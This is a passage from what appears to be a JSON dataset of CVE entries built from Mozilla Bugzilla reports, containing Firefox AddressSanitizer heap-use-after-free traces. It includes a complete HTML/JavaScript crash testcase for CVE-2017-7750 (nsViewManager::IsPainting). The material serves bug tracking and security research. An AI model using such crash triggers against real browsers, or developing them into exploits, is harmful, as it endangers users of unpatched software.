/home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #34 0x7f02925e05d8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #35 0x7f029339de01 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #36 0x7f02932fffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #37 0x7f02932fffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #38 0x7f02932fffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #39 0x7f02986125ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #40 0x7f029bc16a17 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:875:22 #41 0x7f02932fffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #42 0x7f02932fffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #43 0x7f02932fffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #44 0x7f029bc1640f in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 #45 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #46 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #47 0x7f02adc8082f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #48 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x60d0000c9df0 is located 0 bytes inside of 136-byte region [0x60d0000c9df0,0x60d0000c9e78) freed by thread T0 (Web Content) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f02927e102b in mozilla::net::nsSimpleURI::Release() /home/worker/workspace/build/src/netwerk/base/nsSimpleURI.cpp:49:1 #2 0x7f029b14fdac in Release /home/worker/workspace/build/src/dom/base/nsDOMNavigationTiming.h:31:3 #3 0x7f029b14fdac in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40 #4 0x7f029b14fdac in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:395 #5 0x7f029b14fdac in assign_assuming_AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:65 #6 0x7f029b14fdac in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:166 #7 0x7f029b14fdac in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7645 #8 0x7f029b14c218 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7465:7 #9 0x7f029b15336f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7362:13 #10 0x7f0293ecfb59 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1276:3 #11 0x7f0293eceb0c in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:860:14 #12 0x7f0293ecb958 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:749:9 #13 0x7f0293ecd822 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:631:5 #14 0x7f0293ece54c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:487:14 #15 0x7f0292792602 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #16 0x7f029278eab3 in mozilla::net::nsLoadGroup::Cancel(nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:265:15 #17 0x7f0293ecaf8f in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:245:22 #18 0x7f029b0dd0c9 in Stop /home/worker/workspace/build/src/docshell/base/nsDocShell.h:190:25 #19 0x7f029b0dd0c9 in nsDocShell::Stop(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5566 #20 0x7f029b102c24 in nsDocShell::InternalLoad(nsIURI*, nsIURI*, bool, nsIURI*, unsigned int, nsIPrincipal*, nsIPrincipal*, unsigned int, nsAString const&, char const*, nsAString const&, nsIInputStream*, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsAString const&, nsIDocShell*, nsIURI*, bool, nsIDocShell**, nsIRequest**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:10700:12 #21 0x7f029b1371ab in nsDocShell::Reload(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5502:10 #22 0x7f0294d6148f in mozilla::dom::Location::Reload(bool) /home/worker/workspace/build/src/dom/base/Location.cpp:814:18 #23 0x7f029551493b in Reload /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Location.h:74:14 #24 0x7f029551493b in mozilla::dom::LocationBinding::reload(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Location*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/LocationBinding.cpp:873 #25 0x7f029689344e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #26 0x7f029c0ccc63 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #27 0x7f029c0ccc63 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:455 #28 0x7f029c0cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 #29 0x7f029cce08ee in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f029cc97f94 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #31 0x7f029ccc1153 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #32 0x7f029ccc3ab7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #33 0x7f029c0ccfb3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #34 0x7f029c0ccfb3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:437 #35 0x7f029c0b568f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:12 #36 0x7f029c0b568f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2997 #37 0x7f029c09bb28 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:395:12 #38 0x7f029c0ccde8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473:15 #39 0x7f029c0cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 previously allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f02927e8f04 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f02927e8f04 in mozilla::net::nsSimpleURI::StartClone(mozilla::net::nsSimpleURI::RefHandlingEnum, nsACString const&) /home/worker/workspace/build/src/netwerk/base/nsSimpleURI.cpp:594 #4 0x7f02927e9574 in mozilla::net::nsSimpleURI::CloneInternal(mozilla::net::nsSimpleURI::RefHandlingEnum, nsACString const&, nsIURI**) /home/worker/workspace/build/src/netwerk/base/nsSimpleURI.cpp:635:31 #5 0x7f0292777571 in NS_EnsureSafeToReturn(nsIURI*, nsIURI**) /home/worker/workspace/build/src/netwerk/base/nsNetUtil.cpp:1777:24 #6 0x7f02927779cf in ToImmutableURI /home/worker/workspace/build/src/netwerk/base/nsIOService.cpp:1569:19 #7 0x7f02927779cf in non-virtual thunk to mozilla::net::nsIOService::ToImmutableURI(nsIURI*, nsIURI**) /home/worker/workspace/build/src/netwerk/base/nsIOService.cpp:1562 #8 0x7f02927ae23d in NS_TryToMakeImmutable(nsIURI*, nsresult*) /home/worker/workspace/build/src/netwerk/base/nsNetUtil.cpp:1805:20 #9 0x7f029b10b1e8 in nsDocShell::SetCurrentURI(nsIURI*, nsIRequest*, bool, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:1985:17 #10 0x7f029b14bd71 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7422:9 #11 0x7f029b15336f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7362:13 #12 0x7f0293ecfb59 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1276:3 #13 0x7f0293ece2ef in nsDocLoader::FireOnStateChange(nsIWebProgress*, nsIRequest*, int, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1239:14 #14 0x7f0293eccc94 in doStartURLLoad /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:797:3 #15 0x7f0293eccc94 in nsDocLoader::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:481 #16 0x7f0293eccf8c in non-virtual thunk to nsDocLoader::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:392:14 #17 0x7f02927914da in mozilla::net::nsLoadGroup::AddRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:510:28 #18 0x7f0297096bdd in nsHTMLDocument::CreateAndAddWyciwygChannel() /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2416:21 #19 0x7f02970950f8 in nsHTMLDocument::Open(JSContext*, nsAString const&, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1778:3 #20 0x7f0297092661 in nsHTMLDocument::Open(nsAString const&, nsAString const&, nsAString const&, JSContext*, unsigned char, nsISupports**) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1435:14 #21 0x7f02970985d7 in nsHTMLDocument::WriteCommon(JSContext*, nsAString const&, bool) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1940:10 #22 0x7f0297097a49 in nsHTMLDocument::WriteCommon(JSContext*, mozilla::dom::Sequence<nsString> const&, bool, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1875:10 #23 0x7f02965d4925 in mozilla::dom::HTMLDocumentBinding::write(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:654:9 #24 0x7f029689344e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #25 0x7f029c0ccc63 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #26 0x7f029c0ccc63 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:455 #27 0x7f029c0cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 #28 0x7f029cce08ee in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #29 0x7f029cc97f94 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #30 0x7f029ccc1153 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #31 0x7f029ccc3ab7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #32 0x7f029c0ccfb3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #33 0x7f029c0ccfb3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:437 #34 0x7f029c0b568f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:12 #35 0x7f029c0b568f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2997 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/netwerk/base/Predictor.cpp:191:8 in IsNullOrHttp Shadow bytes around the buggy address: 0x0c1a80011360: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 0x0c1a80011370: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1a80011380: 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 0x0c1a80011390: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c1a800113a0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c1a800113b0: 00 00 00 00 00 00 fa fa fa fa fa fa fa fa[fd]fd 0x0c1a800113c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1a800113d0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1a800113e0: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa 0x0c1a800113f0: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80011400: fd fd fd fa fa fa fa fa fa fa fa fa 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==23074==ABORTING"
      }
    ],
    "CVE-2017-7750": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1356558",
        "title": "heap-use-after-free in nsViewManager::IsPainting",
        "description": "The following testcase crashes the latest ASAN build of Firefox: <script> function start() { o2=document.createElement('iframe'); o2.src=\"data:text/html,<div>\"; o2.addEventListener('load', fun0,false); document.body.appendChild(o2); } function fun0() { o456=frames[0]; o457=o456.document; o457.designMode='on'; o544=o457.createElement('audio'); o545=document.createElement('track'); o544.appendChild(o545); o457.write('<div>'); o544.controls^=1; o457.documentElement.appendChild(o544); o457.defaultView.onerror=fun3; setTimeout(fun2, 4); } function fun2() { document.documentElement.hidden^=true; } function fun3() { document.documentElement.style.display='grid'; document.documentElement.getBoundingClientRect(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==10317==ERROR: AddressSanitizer: heap-use-after-free on address 0x60600031d7b0 at pc 0x7f30c7d993cb bp 0x7fff70111a40 sp 0x7fff70111a38 READ of size 8 at 0x60600031d7b0 thread T0 (Web Content) #0 0x7f30c7d993ca in RootViewManager /home/worker/workspace/build/src/view/nsViewManager.h:373:51 #1 0x7f30c7d993ca in IsPainting /home/worker/workspace/build/src/view/nsViewManager.h:364 #2 0x7f30c7d993ca in nsViewManager::IsPainting(bool&) /home/worker/workspace/build/src/view/nsViewManager.cpp:1083 #3 0x7f30c851eb35 in IsSafeToFlush /home/worker/workspace/build/src/layout/base/PresShell.cpp:4069:20 #4 0x7f30c851eb35 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4139 #5 0x7f30c8491162 in FlushPendingNotifications /home/worker/workspace/build/src/layout/base/nsIPresShell.h:608:5 #6 0x7f30c8491162 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1807 #7 0x7f30c849fa23 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:299:7 #8 0x7f30c849f6f4 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:321:5 #9 0x7f30c84a1d5b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:711:5 #10 0x7f30c84a1d5b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:624 #11 0x7f30c84a1a59 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:525:9 #12 0x7f30c8cebc64 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:64:16 #13 0x7f30c2f78647 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #14 0x7f30c2c36d46 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1512:28 #15 0x7f30c2b96880 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1872:25 #16 0x7f30c2b930c7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1807:17 #17 0x7f30c2b954f4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1680:5 #18 0x7f30c2b95af6 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1713:15 #19 0x7f30c1de3b90 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #20 0x7f30c1de05d8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #21 0x7f30c2b9ddf6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:124:5 #22 0x7f30c2afffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #23 0x7f30c2afffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #24 0x7f30c2afffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #25 0x7f30c7e125ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #26 0x7f30cb416a17 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:875:22 #27 0x7f30c2afffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #28 0x7f30c2afffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #29 0x7f30c2afffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #30 0x7f30cb41640f in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 #31 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #32 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #33 0x7f30dd56a82f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #34 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x60600031d7b0 is located 48 bytes inside of 64-byte region [0x60600031d780,0x60600031d7c0) freed by thread T0 (Web Content) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f30c85f28a3 in operator delete /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:218:12 #2 0x7f30c85f28a3 in Release /home/worker/workspace/build/src/view/nsViewManager.h:33 #3 0x7f30c85f28a3 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40 #4 0x7f30c85f28a3 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:395 #5 0x7f30c85f28a3 in assign_assuming_AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:65 #6 0x7f30c85f28a3 in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:166 #7 0x7f30c85f28a3 in nsDocumentViewer::Hide() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2188 #8 0x7f30ca941be9 in SetVisibility /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6513:9 #9 0x7f30ca941be9 in non-virtual thunk to nsDocShell::SetVisibility(bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6503 #10 0x7f30c47729fa in nsFrameLoader::Hide() /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:1312:12 #11 0x7f30c89c8b61 in nsHideViewer::Run() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:922:21 #12 0x7f30c431d81f in nsContentUtils::RemoveScriptBlocker() /home/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5362:15 #13 0x7f30c851f023 in ~nsAutoScriptBlocker /home/worker/workspace/build/src/obj-firefox/dist/include/nsContentUtils.h:2986:5 #14 0x7f30c851f023 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4210 #15 0x7f30c8491954 in FlushPendingNotifications /home/worker/workspace/build/src/layout/base/nsIPresShell.h:608:5 #16 0x7f30c8491954 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1772 #17 0x7f30c849fa23 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:299:7 #18 0x7f30c849f6f4 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:321:5 #19 0x7f30c84a1d5b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:711:5 #20 0x7f30c84a1d5b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:624 #21 0x7f30c84a1a59 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:525:9 #22 0x7f30c8cebc64 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:64:16 #23 0x7f30c2f78647 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #24 0x7f30c2c36d46 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1512:28 #25 0x7f30c2b96880 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1872:25 #26 0x7f30c2b930c7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1807:17 #27 0x7f30c2b954f4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1680:5 #28 0x7f30c2b95af6 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1713:15 #29 0x7f30c1de3b90 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #30 0x7f30c1de05d8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #31 0x7f30c2b9ddf6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:124:5 #32 0x7f30c2afffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #33 0x7f30c2afffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #34 0x7f30c2afffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #35 0x7f30c7e125ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #36 0x7f30cb416a17 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:875:22 #37 0x7f30c2afffe0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #38 0x7f30c2afffe0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #39 0x7f30c2afffe0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #40 0x7f30cb41640f in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:699:34 #41 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #42 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #43 0x7f30dd56a82f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 previously allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f30c85f1e3b in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f30c85f1e3b in nsDocumentViewer::MakeWindow(nsSize const&, nsView*) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2446 #4 0x7f30c85fe6f0 in nsDocumentViewer::Show() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2104:10 #5 